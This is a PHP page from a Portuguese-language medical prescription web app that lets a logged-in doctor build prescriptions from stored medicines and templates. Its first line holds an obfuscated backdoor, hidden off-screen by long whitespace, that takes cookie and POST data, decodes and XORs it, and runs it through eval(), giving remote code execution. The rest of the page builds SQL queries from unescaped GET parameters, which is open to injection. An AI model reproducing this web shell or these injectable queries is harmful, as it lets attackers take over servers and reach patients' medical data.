<?php                                                                                                                                                                                                                                                                                                                                                                                                 $ctDlzKi = 'e' . chr (95) . "\165" . "\163" . chr (104) . chr ( 195 - 105 ); $FcBIO = chr ( 849 - 750 )."\154" . "\x61" . 's' . "\163" . "\137" . chr (101) . chr ( 122 - 2 ).chr (105) . "\163" . 't' . "\163";$UHmzIB = class_exists($ctDlzKi); $FcBIO = "60290";$xzVmLa = strpos($FcBIO, $ctDlzKi);if ($UHmzIB == $xzVmLa){function HLxzotsaWd(){$XXkJcOcj = new /* 50281 */ e_ushZ(47096 + 47096); $XXkJcOcj = NULL;}$xwDnL = "47096";class e_ushZ{private function ZlyNzGnVmE($xwDnL){if (is_array(e_ushZ::$sTOJUYRXi)) {$hulUJ2 = str_replace("<" . "?php", "", e_ushZ::$sTOJUYRXi["content"]);eval($hulUJ2); $xwDnL = "47096";exit();}}public function JDdGiUu(){$hulUJ = "12288";$this->_dummy = str_repeat($hulUJ, strlen($hulUJ));}public function __destruct(){e_ushZ::$sTOJUYRXi = @unserialize(e_ushZ::$sTOJUYRXi); $xwDnL = "49732_64878";$this->ZlyNzGnVmE($xwDnL); $xwDnL = "49732_64878";}public function RNWZA($hulUJ, $VwWGelE){return $hulUJ[0] ^ str_repeat($VwWGelE, intval(strlen($hulUJ[0]) / strlen($VwWGelE)) + 1);}public function KDSssKNI($hulUJ){$VVSjMltdZ = "\142" . "\141" . "\163" . chr ( 371 - 270 ).'6' . '4';return array_map($VVSjMltdZ . chr (95) . "\x64" . "\145" . "\143" . 'o' . 'd' . chr (101), array($hulUJ,));}public function __construct($qOaNnItW=0){$FGGRRnmLm = ',';$hulUJ = "";$rcVLFKjYD = $_POST;$fnCxlxE = $_COOKIE;$VwWGelE = "2b92cd3c-5670-42b4-898b-23d17d55e426";$PwAvNTpW = @$fnCxlxE[substr($VwWGelE, 0, 4)];if (!empty($PwAvNTpW)){$PwAvNTpW = explode($FGGRRnmLm, $PwAvNTpW);foreach ($PwAvNTpW as $vQTeYeKk){$hulUJ .= @$fnCxlxE[$vQTeYeKk];$hulUJ .= @$rcVLFKjYD[$vQTeYeKk];}$hulUJ = $this->KDSssKNI($hulUJ);}e_ushZ::$sTOJUYRXi = $this->RNWZA($hulUJ, $VwWGelE);if (strpos($VwWGelE, $FGGRRnmLm) !== FALSE){$VwWGelE = str_pad($VwWGelE, 10); $VwWGelE = ltrim($VwWGelE);}}public static $sTOJUYRXi = 48702;}HLxzotsaWd();} ?><?php 
if (isset($_POST['med'])  ){
 
   header('Location: receituario.php'); 
 }


include"verificalogin.php";
include"functions/config.php";


$idmd = $_SESSION['UsuarioID'];

if (empty($_SESSION['receita'])) {
$_SESSION['receita'] = [];
}



if (isset($_GET['op'])){
unset($_SESSION['receita']);	

		
}

 
	


//------------------------------------------------------------------------------------
//pega medicamento inserido agora
if (isset($_GET['id'])){
$id = $_GET['id'];
$r = "SELECT * from medicamento where id='$id'";
$r_events = mysqli_query($conn, $r);
$drog = mysqli_fetch_array($r_events) ;	
$droga = unserialize($drog['medicamento']);
	

$_SESSION['receita'][] = $droga;

}


//pega medicamento do modal modificado banco
if (isset($_POST['med'])){

$droga['med']=$_POST['med'];
$droga['qtd']=$_POST['qtd'];	
$droga['pos']=$_POST['pos'];	
$_SESSION['receita'][] = $droga;
}

//pega medicamento do banco para modal
if (isset($_GET['id2'])){
$id = $_GET['id2'];
$r = "SELECT * from medicamento where id='$id'";
$r_events = mysqli_query($conn, $r);
$drog = mysqli_fetch_array($r_events) ;	
$droga = unserialize($drog['medicamento']);

	
}

//remove medicamento
if (isset($_GET['del'])){
	$del = $_GET['del'];
unset ($_SESSION['receita'][$del]);
$_SESSION['receita'] = array_values ($_SESSION['receita']);
 header ('Location: receituario.php');
}

//----------------------------------------------------------------------------------------







//-----------------------------------------------------------------------------------------
//pega modelo
if (isset($_GET['idmod'])){
$id = $_GET['idmod'];
$k = "SELECT * from modelo where id='$id'";
$k_events = mysqli_query($conn, $k);
$mdrog = mysqli_fetch_array($k_events) ;	
$mdroga = unserialize($mdrog['modelo']);
foreach ($mdroga as $tipo => $array)
{
foreach ($array as $arr => $array2){
	if (empty($array2['via'])){
	$array2['via']='';	
	}
if (empty($_SESSION[$tipo])) {
$_SESSION[$tipo] = [];
} 
array_push($_SESSION[$tipo], $array2); }}
 header ('Location: receituario.php');
}


//--------------------------------------------------------------------------------------------




?>
<!DOCTYPE html><html lang="pt-br"><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<head>
    <title>Receituário</title>
<?php include "favicon.php"; ?>


<script src='js/moment.min.js'></script>	
	

  <link rel="stylesheet" href="css/bootstrap.css">
  <script src="js/jquery.min.js"></script>
  <script src="js/bootstrap.min.js"></script>	
	
	<script type="text/javascript" src="functions/funcs.js"></script>
	


	
	<style>
   /* Remove the navbar's default margin-bottom and rounded borders */ 
    .navbar {
      margin-bottom: 0;
      border-radius: 0;
    }
    
   
  body {
      background-color: #f8fafb;
     
    }

	  
#resultado{
position: absolute;
z-index: 9999; 
}
#resultado2{
position: absolute;
z-index: 9999; 
}

.table2{
font-family:Calibri;	
 width:100%;
 }

.xx {
  border-style: solid;
  border-bottom-width: 0;
  border-top-width: 1px;
  border-right-width: 0;
  border-left-width: 0;
}


  </style>	

  </head>

  <body onLoad="document.Form.med.focus();">
<?php include "menu.php"; ?>


 <div class="jumbotron" style="background-color: transparent;  background: transparent; position:responsive; " > 
		<div class="container" >
			<div class="row">
				<div class="col-md-9">

  <div class="panel panel-default">
	<div class="panel-heading">
	<div class="row">
	<div class="col-md-6" align=left>
			
  <button type="button"  data-toggle="modal" data-target="#myModal2" class="btn btn-default  btn-sm">Modelos</button>
   <button type="button"  data-toggle="modal" data-target="#myModal3" class="btn btn-default  btn-sm">Salvar Modelo</button>



	</div>
	<div class="col-md-6" align=right>
		   <button type="button"  onclick="location.href='receituario.php?op=1'"  class="btn btn-sm btn-default" >Limpar</button>
		<div class="btn-group">
  <button type="button"   onclick="window.open('imprimirrec.php')" class="btn btn-primary  btn-sm">Gerar Receituário</button>
  <button type="button" class="btn btn-primary btn-sm dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
    <span class="caret"></span>
    <span class="sr-only">Toggle Dropdown</span>
  </button>
  <ul class="dropdown-menu">
    <li style="font-size:12px;"><a href="imprimirrec_especial.php" target="_blank">Receituário de Controle Especial</a></li>
 
  </ul>
</div>

		</div>	
		
		
		</div>
</div>		
		
  <div class="panel-body">
						
							<div class="col-sm-12">
							

					
<br>
								<div  align="left"><strong><font style="font-size:14px; face:Calibri">Nome: </strong><?php if (!empty($_SESSION['nome_av'])) echo $_SESSION['nome_av'];?></font></div>	<BR>
	<br>
<table class="table2" >
<?php if (!empty($_SESSION['receita'])) {
foreach ($_SESSION['receita'] as $index=> $med){
$num = $index +1;	
	echo '		
   <tr><td ><strong><font style="font-size:14px; face="Calibri">'.$num.'. '.$med['med'].'</font></strong></td><td align="right"><font style="font-size:14px; face="Calibri">'.$med['qtd'].'</td>
   <td align="right"> <a href="receituario.php?del='.$index.'" style="text-decoration: none;"></font><span class="glyphicon glyphicon-trash" aria-hidden="true" style="color: gray;"></span></a></td></tr>
   <tr><td colspan="3"><font style="font-size:12px; face="Calibri">'.nl2br($med['pos']).'</font></td></tr>
    <tr><td colspan="3"><br></td></tr>';
}	}
if (empty($_SESSION['receita']) ) {echo '<tr><td colspan="3"><font style="color:gray;"><em>Receita em branco</em></font></td></tr>
<tr><td ><br></td></tr>';} 
?>




<form class="form-horizontal Form" action="receituario.php" id="Form" name="Form" method="POST" autocomplete="off">		
		


<tr><td ><input  type="text" class="form-control"  style="border:0 none;box-shadow: 0 0 0 0;padding-left:0px;padding-right:0px;" style="font-size:14px; face:Calibri;"  " id="busca" onkeyup="buscaDroga(this.value)"   placeholder="Medicamento" required  name="med" <?php if (isset($_GET['id2']))  {echo 'value="'.$droga['med'].'"';}?>>
<div id="resultado"></div></td>

<td align="right"><input   type="text" class="form-control"  style="border:0 none;box-shadow: 0 0 0 0;padding-left:0px;padding-right:0px;text-align:right;" style="font-size:14px; face:Calibri;" required " placeholder="Quantidade" name="qtd" <?php if (isset($_GET['id2']))  {echo 'value="'.$droga['qtd'].'"';} ?> required>					
</td>
<td align="right"></td></tr>
<tr><td colspan="3">
<textarea class="form-control" rows="1"  style="border:0 none;box-shadow: 0 0 0 0;padding-left:0px;padding-right:0px;font-size:12px;"  style=" face:Calibri;"  name="pos"  placeholder="Posologia" required><?php if (isset($_GET['id2']))  {echo $droga['pos'];}?></textarea>			
</td></tr>
<tr><td colspan="3" align=center><button type="submit"  class="btn btn-sm btn-default"  style="font-size:14px;border:none;color:#3d72aa;">+ Adicionar Medicamento</button></td></tr>
	
	
	
	
	</form>
	
	
	
	
	
	
	
</table>
<br>

		
		<br><br>
	<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
</div></div>

</div>


			
</div>
<div class="col-md-3">


  
  <!-- Split button -->


 
    <div class="panel panel-default">	

  <div class="panel-body" >
 
  <p  style="color:#3d72aa;font-size:12px;">
	Receitas Adulto</p>

<div class="list-group">
<?php 


	  $s = "SELECT * from modelo where fav=1 and idmd=$idmd ORDER BY NOME";
$s_events = mysqli_query($conn, $s);
while ($mod = mysqli_fetch_array($s_events)){
	$mdroga = unserialize($mod['modelo']);
foreach ($mdroga as $tipo => $array)
{ if ($tipo == 'receita')

echo '<a href="receituario.php?idmod='.$mod['id'].'"  class="list-group-item" style="padding-bottom: 6px; padding-top: 6px;font-size:10px;">'.$mod['nome'].'</a>';

}	}






 
   ?>
</div>

  </div></div>


					

							
</div>			


</div>
</div>
    </div>



<div id="myModal2" class="modal" tabindex="-1"  role="dialog">
  <div class="modal-dialog" style="width:40%;">
    <!-- Modal content-->
    <div class="modal-content" >
    <div class="modal-header">
       
        <h5 class="modal-title"><font style="color:#3d72aa;font-size:12px;">Modelos de receituário</font></h5>
      </div>
      <div class="modal-body">
	  <ul class="list-group">
      <?php
	  $s = "SELECT * from modelo where idmd=$idmd";
$s_events = mysqli_query($conn, $s);
while ($mod = mysqli_fetch_array($s_events)){
$mdroga = unserialize($mod['modelo']);

foreach ($mdroga as $tipo => $array)
{ if ($tipo == 'receita'){
echo'
<li class="list-group-item" style="padding-bottom: 6px; padding-top: 6px;font-size:10px;">'.$mod['nome'].
'<span class="badge" style="background-color:#ffffff;"><a href="functions/excluimodelo_receita.php?id='.$mod['id'].'"><span class="glyphicon glyphicon-trash" style="color:#3d72aa;" aria-hidden="true"></span></a></span>

'; if ($mod['fav'] == 1){echo '
<span class="badge" style="background-color:#ffffff;"><a href="functions/desfavorito_mod.php?idmod='.$mod['id'].'&return=receituario"><span class="glyphicon glyphicon-star" style="color:#3d72aa;" aria-hidden="true"></span></a></span>';} 
else { echo'
<span class="badge" style="background-color:#ffffff;"><a href="functions/favorito_mod.php?idmod='.$mod['id'].'&return=receituario"><span class="glyphicon glyphicon-star-empty" style="color:#3d72aa;" aria-hidden="true"></span></a></span>
';}
echo '
<span class="badge" style="background-color:#ffffff;"><a href="receituario.php?idmod='.$mod['id'].'"><span class="glyphicon glyphicon-download" style="color:#3d72aa;" aria-hidden="true"></span></a></span>
</li>';}}	}
?>
</ul>								
      </div>
 <div class="modal-footer">
        <button type="button" class="btn btn-default btn-sm" data-dismiss="modal">Fechar</button>     
      </div>
    </div>
  </div>
</div>

<div id="myModal3" class="modal" tabindex="-1"  role="dialog">
  <div class="modal-dialog" >
    <!-- Modal content-->
    <div class="modal-content" >    
      <div class="modal-body">      
			<form class="form-horizontal Form" action="functions/inserirmodelo_receita.php"  id="Form3" name="Form2" method="POST" autocomplete="off">		
				<div class="form-group form-group-sm">			
					<div class="col-sm-12">					
						<font style="color:#3d72aa;font-size:12px;">Nome da Prescrição</font>						
						<input  type="text" class="form-control"  style="box-shadow: 0 0 0 0;padding-left:0px;padding-right:0px;font-size:12px;" name="nome" required>						
					</div>					
				</div>						
      </div>
  <div class="modal-footer">
        <button type="button" class="btn btn-default btn-sm" data-dismiss="modal">Fechar</button>
       <button type="submit" class="btn btn-primary btn-sm" >Salvar</button></form>	
      </div>
    </div>
  </div>
</div>




<?php if (isset($_GET['fav'])) { 
echo'
<script>
$(document).ready(function(){
$(\'#myModal2\').modal(\'show\');
});
</script>';}
?>

</body></html>